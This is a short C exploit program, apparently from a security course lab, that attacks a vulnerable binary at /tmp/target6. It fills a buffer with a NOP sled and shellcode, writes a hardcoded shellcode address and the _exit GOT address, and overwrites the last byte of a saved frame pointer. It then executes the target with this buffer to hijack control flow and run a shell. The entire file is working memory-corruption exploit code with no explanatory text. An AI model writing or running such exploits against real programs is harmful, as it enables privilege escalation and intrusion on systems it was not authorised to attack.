#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"
#define PAYLOAD_SIZE 201
#define NOP 0x90
#define GOT 0x8049774
#define SHELL_ADDR 0xbffffc90

int main(void)
{
  char *args[3];
  char *env[1];

  char payload[PAYLOAD_SIZE];
  memset(payload, NOP, PAYLOAD_SIZE);
  memcpy(payload+PAYLOAD_SIZE-1-4-4-strlen(shellcode), shellcode, strlen(shellcode));
  *(int *)(payload+PAYLOAD_SIZE-1-4-4) = SHELL_ADDR; //set variable a to be shellcode address
  *(int *)(payload+PAYLOAD_SIZE-1-4) = GOT; //set variable p to be _exit GOT address
  payload[PAYLOAD_SIZE-1] = 0x48; // modify EBP last byte to let foo EBP point back to bar EBP address
  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
